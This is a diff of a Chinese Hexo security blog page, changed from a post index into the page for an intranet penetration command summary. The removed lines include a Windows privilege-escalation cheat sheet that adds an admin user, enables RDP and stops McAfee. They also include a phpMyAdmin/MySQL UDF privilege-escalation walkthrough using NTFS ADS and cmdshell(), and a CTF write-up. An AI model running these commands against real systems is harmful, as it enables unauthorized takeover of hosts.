@@ -4,23 +4,24 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>Bug&#39;小虫</title>
+    <title>内网渗透命令总结 | Bug&#39;小虫</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="小虫">
     
 
     
-    <meta name="description" content="hark">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Bug&#39;小虫">
-<meta property="og:url" content="http://yoursite.com/page/5/index.html">
+    <meta name="description" content="域常用操作命令：          net group /domain //获得所有域用户组列表   net group qq_group /domain //显示域中qq_group组的成员   net group qq_group /del /domain //删除域中qq_group组   net group qq_group qq /del /domain //删除域内qq_group 群">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透命令总结">
+<meta property="og:url" content="http://yoursite.com/2016/01/01/内网渗透命令总结/index.html">
 <meta property="og:site_name" content="Bug&#39;小虫">
-<meta property="og:description" content="hark">
+<meta property="og:description" content="域常用操作命令：          net group /domain //获得所有域用户组列表   net group qq_group /domain //显示域中qq_group组的成员   net group qq_group /del /domain //删除域中qq_group组   net group qq_group qq /del /domain //删除域内qq_group 群">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-07-17T17:31:22.502Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Bug&#39;小虫">
-<meta name="twitter:description" content="hark">
+<meta name="twitter:title" content="内网渗透命令总结">
+<meta name="twitter:description" content="域常用操作命令：          net group /domain //获得所有域用户组列表   net group qq_group /domain //显示域中qq_group组的成员   net group qq_group /del /domain //删除域中qq_group组   net group qq_group qq /del /domain //删除域内qq_group 群">
 
     
     <link rel="alternative" href="/atom.xml" title="Bug&#39;小虫" type="application/atom+xml">
@@ -70,174 +71,10 @@
 </div>
     </header>
     <div id="container">
-      <div id="main">
-
-   
-    
-    <article class="post-expand [layout]" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2016/01/01/渗透前期准备之靶机搭建/" title="渗透测试前期准备之靶机搭建" itemprop="url">渗透测试前期准备之靶机搭建</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
-		
-  <p class="article-time">
-    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h1 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h1><ul>
-<li>[VMware] (<a href="https://www.vmware.com/cn.html" target="_blank" rel="noopener">https://www.vmware.com/cn.html</a>)</li>
-<li>[win2003系统]</li>
-</ul>
-<p>1，首先下载个虚拟机，一直下一步，然后选择镜像win2003，一直下一步，</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/1%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>2，安装界面</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/2%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>3，安装好后点击开始——&gt;管理你的服务器——&gt;添加或删除角色——&gt;下一步——&gt;应用程序服务器（IIS）——&gt;下一步<br>添加成功</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/3%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>4,后可以在开始菜单栏——&gt;管理工具看到，把它快捷方式发送到桌面</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/4%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>5，在百度上搜索asp网站源码，下载一个</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/5%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>6，点击进入IIS服务器，网站——&gt;新建——&gt;一直下一步，然后网站目录填写下载好的网站的目录。</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/6%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>7,安装成功，浏览一下，看是否可以访问</p>
-<p> <img src="http://opgnaclz6.bkt.clouddn.com/7%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-<div class="article-categories">
-  <span></span>
-  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/工具/">工具</a>
-</div>
-
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand [layout]" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2016/01/01/windows提权常用命令/" title="windows提权常用命令" itemprop="url">windows提权常用命令</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
-		
-  <p class="article-time">
-    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p>平时常用到的windows提权命令，纯粹当成个人笔记方便以后查阅。还在不断更新中。。。。。。<br>开启3389:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></p>
-<p>查看3389:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server\WinStations\RDP-Tcp /v PortNumber</span><br></pre></td></tr></table></figure></p>
-<p>查看端口8001被哪个进程占用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr <span class="string">"8001"</span></span><br></pre></td></tr></table></figure></p>
-<p>查看PID3736<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist | findstr <span class="string">"3736"</span></span><br></pre></td></tr></table></figure></p>
-<p>结束进程<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskkill /f /t /im java.exe</span><br></pre></td></tr></table></figure></p>
-<p>查看版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ver</span><br></pre></td></tr></table></figure></p>
-<p>查看当前用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure></p>
-<p>查看系统配置信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure></p>
-<p>查看用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure></p>
-<p>查看进程：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure></p>
-<p>查看正在运行的服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure></p>
-<p>查看开放的所有端口：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure></p>
-<p>查询会话情况：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user  //当前这个服务器中有哪些用户正在访问这个服务器</span><br></pre></td></tr></table></figure></p>
-<p>查看指定服务的路径：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc qc mssql</span><br></pre></td></tr></table></figure></p>
-<p>添加一个用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user xiaochong xiaochong /add</span><br></pre></td></tr></table></figure></p>
-<p>提升到管理权限：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators xiaochong /add</span><br></pre></td></tr></table></figure></p>
-<p>添加用户并提升权限：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user jianmei daxia.asd /add &amp; net localgroup administrators jianmei /add</span><br></pre></td></tr></table></figure></p>
-<p>查看指定用户的信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user xiaochong</span><br></pre></td></tr></table></figure></p>
-<p>查看所有管理权限的用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure></p>
-<p>加入远程桌面用户组：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup “Remote Desktop Users” xiaochong /add</span><br></pre></td></tr></table></figure></p>
-<p>突破最大连接数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mstsc /admin /v:192.168.1.101</span><br></pre></td></tr></table></figure></p>
-<p>删除用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user xiaochong /del</span><br></pre></td></tr></table></figure></p>
-<p>开启TELNET服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start telnet</span><br></pre></td></tr></table></figure></p>
-<p>关闭麦咖啡：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop “McAfee McShield”</span><br></pre></td></tr></table></figure></p>
-<p>查看当前目录的所有文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir c:\windows\</span><br></pre></td></tr></table></figure></p>
-<p>查看指定文件的内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\windows\Debug.txt</span><br></pre></td></tr></table></figure></p>
-<p>把Debug.txt复制到C:\windows\addins\并命名为cmd.txt：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\windows\Debug.txt C:\windows\addins\cmd.txt</span><br></pre></td></tr></table></figure></p>
-<p>切换到系统根目录：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> \</span><br></pre></td></tr></table></figure></p>
-<p>返回上一级目录：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ..</span><br></pre></td></tr></table></figure></p>
-<p>进入系统e盘：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e：</span><br></pre></td></tr></table></figure></p>
-<p>如果直接进入c:\windows\system32\目录，可执行如下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pushd c:\windows\system32\</span><br></pre></td></tr></table></figure></p>
-<p>创建ahackj文件夹：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Md xiaochong</span><br></pre></td></tr></table></figure></p>
-<p>删除xiaochong文件夹：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rd xiaochong</span><br></pre></td></tr></table></figure></p>
-<p>删除网站目录下的xiaochong.asp文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Del E:\xinyun\xiaochong.asp</span><br></pre></td></tr></table></figure></p>
-<p>创建空的文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> nul&gt;文件名</span><br></pre></td></tr></table></figure></p>
-<p>创建有内容文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"内容"</span>&gt;文件名</span><br></pre></td></tr></table></figure></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-<div class="article-categories">
-  <span></span>
-  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提权/">提权</a>
-</div>
-
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand [layout]" itemprop="articleBody"> 
-        <header class="article-info clearfix">
+      <div id="main" class="[layout]" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
   <h1 itemprop="name">
     
       <a href="/2016/01/01/内网渗透命令总结/" title="内网渗透命令总结" itemprop="url">内网渗透命令总结</a>
@@ -251,9 +88,16 @@
     
   </p>
 </header>
-    <div class="article-content">
-        
-        <h3 id="域常用操作命令："><a href="#域常用操作命令：" class="headerlink" title="域常用操作命令："></a>域常用操作命令：</h3><table>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#域常用操作命令："><span class="toc-number">1.</span> <span class="toc-text">域常用操作命令：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基本内网渗透命令："><span class="toc-number">2.</span> <span class="toc-text">基本内网渗透命令：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内网网络结常用命令："><span class="toc-number">3.</span> <span class="toc-text">内网网络结常用命令：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows自带端口转发："><span class="toc-number">4.</span> <span class="toc-text">windows自带端口转发：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#敏感数据和目录："><span class="toc-number">5.</span> <span class="toc-text">敏感数据和目录：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dsquery的AD查询工具："><span class="toc-number">6.</span> <span class="toc-text">dsquery的AD查询工具：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOS常用快捷命令："><span class="toc-number">7.</span> <span class="toc-text">DOS常用快捷命令：</span></a></li></ol>
+		
+		</div>
+		
+		<h3 id="域常用操作命令："><a href="#域常用操作命令：" class="headerlink" title="域常用操作命令："></a>域常用操作命令：</h3><table>
 <thead>
 <tr>
 <th></th>
@@ -854,14 +698,9 @@
 </tr>
 </tbody>
 </table>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
+  
+	</div>
+		<footer class="article-footer clearfix">
 <div class="article-catetags">
 
 <div class="article-categories">
@@ -874,161 +713,45 @@
 
 
 
-
-<div class="comments-count">
+	<div class="article-share" id="share">
 	
-</div>
+	  <div data-url="http://yoursite.com/2016/01/01/内网渗透命令总结/" data-title="内网渗透命令总结 | Bug&#39;小虫" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
 
 </footer>
 
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand [layout]" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2016/01/01/phpMyAdmin UDF提权/" title="phpMyAdmin UDF提权" itemprop="url">phpMyAdmin UDF提权</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
-		
-  <p class="article-time">
-    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p>适用环境：PhpMyAdmin 3.x  ,  MySQL&gt;5.1  ,  无Shell  ,  无法爆绝对路径<br>前提条件： 有MYSQL的ROOT权限<br>思路：利用NTFS ADS创建 plugin目录 —- 导出UDF</p>
-<p>过程：<br>查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir  \\或者 select @@datadir</span><br></pre></td></tr></table></figure></p>
-<p>得到MySQL目录<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\MySql\</span><br></pre></td></tr></table></figure></p>
-<p>假如该目录不存在\lib\plugin目录，利用ADS创建<br>查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">'xxx'</span> into dumpfile <span class="string">'C:\\MySQL\\lib::$INDEX_ALLOCATION'</span>;</span><br></pre></td></tr></table></figure></p>
-<p>此时会报错<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 3 (HY000): Error writing file <span class="string">'C:\MySQL\lib::$INDEX_ALLOCATION'</span> (Errcode: 22)</span><br></pre></td></tr></table></figure></p>
-<p>但是lib目录已经创建了<br>再查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">'xxx'</span> into dumpfile <span class="string">'C:\\MySQL\\lib\\plugin::$INDEX_ALLOCATION'</span>;</span><br></pre></td></tr></table></figure></p>
-<p>导出UDF.DLL<br>随便选一个库<br>查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Temp_udf(udf BLOB);</span><br></pre></td></tr></table></figure></p>
-<p>查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT into Temp_udf values (CONVERT(<span class="variable">$shellcode</span>,CHAR));   //<span class="variable">$shellcode</span>请用UDF用hex加密后的代码</span><br></pre></td></tr></table></figure></p>
-<p>查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT udf FROM Temp_udf INTO DUMPFILE <span class="string">'C:\\MySQL\\lib\\plugin\\udf.dll'</span>;--</span><br></pre></td></tr></table></figure></p>
-<p>注意：在后面记得要加 – 否者会出错，我在此处浪费无限时间(&gt;4h)<br>原因可能是PhpMyAdmin查询时会自动在语句末尾加上Limit 语句，导致出错</p>
-<p>提权<br>查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Create <span class="keyword">function</span> cmdshell returns string soname <span class="string">'udf.dll'</span>;  //此处不能填绝对路径 只能是dll名</span><br></pre></td></tr></table></figure></p>
-<p>查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.func;                  //看看cmdshell <span class="keyword">function</span>是否创立，创立就继续</span><br></pre></td></tr></table></figure></p>
-<p>查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select cmdshell(<span class="string">'net user'</span>);               //运行各种命令提权</span><br></pre></td></tr></table></figure></p>
-<p>UDF用hex加密后的代码(从某个UDF工具里提取的)</p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-<div class="article-categories">
-  <span></span>
-  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提权/">提权</a>
-</div>
-
-
-</div>
-
-
-
-
-<div class="comments-count">
+   	       
+	</article>
 	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand [layout]" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2015/05/07/记一次白帽学院解题过程/" title="记一次白帽学院解题过程" itemprop="url">记一次白帽学院解题过程</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
-		
-  <p class="article-time">
-    <time datetime="2015-05-07T04:41:35.000Z" itemprop="datePublished"> 发表于 2015-05-07</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p>首先使用Burp Suit对该链接进行抓包，结果发现并没有什么用。<br>如图：</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/a1.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>接下来点了一下post按钮，出现了一堆英文，用有道翻译了一下，说是URL不能为空，点击了那个链接，发现也没用</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/a2.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>试试那个链接是不是key，结果不是</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/a3.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>做到这头都快大了，不知道URL要填什么，所以就每样都填了一遍，首先把key填过去发现不是，然后把‘答案’这两字填过去还是不是，把验证码填过去也不是，试验太多就不一一截图了，只截一张吧</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/a4.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>试到Flag01时居然出现了一行不一样的东西</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/a5.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>抱着有点小激动并伴着一点点忐忑的心态把他们都复制过去，提示答案错误，然后又试了一下只复制大括号里的，结果竟然做成功了</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/a6.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-<div class="article-categories">
-  <span></span>
-  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/其他/">其他</a>
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2016/01/01/windows提权常用命令/" title="windows提权常用命令">
+  <strong>上一篇：</strong><br/>
+  <span>
+  windows提权常用命令</span>
+</a>
 </div>
 
 
+<div class="next">
+<a href="/2016/01/01/phpMyAdmin UDF提权/"  title="phpMyAdmin UDF提权">
+ <strong>下一篇：</strong><br/> 
+ <span>phpMyAdmin UDF提权
+</span>
+</a>
 </div>
 
+</nav>
 
-
-
-<div class="comments-count">
 	
-</div>
-
-</footer>
-
-
-    </article>
 
 
 
-
-
-
-
-  <nav id="page-nav" class="clearfix">
-    <a class="extend prev" rel="prev" href="/page/4/"><span></span>Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span>
-  </nav>
-
-</div>
+</div>  
       <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
 
 <div id="asidepart">
@@ -1225,8 +948,36 @@ $(document).ready(function(){
       m.removeClass('moveMain');
       a.css('display', 'block').removeClass('fadeOut');
       o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
         
     }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
   });
 });
 </script>
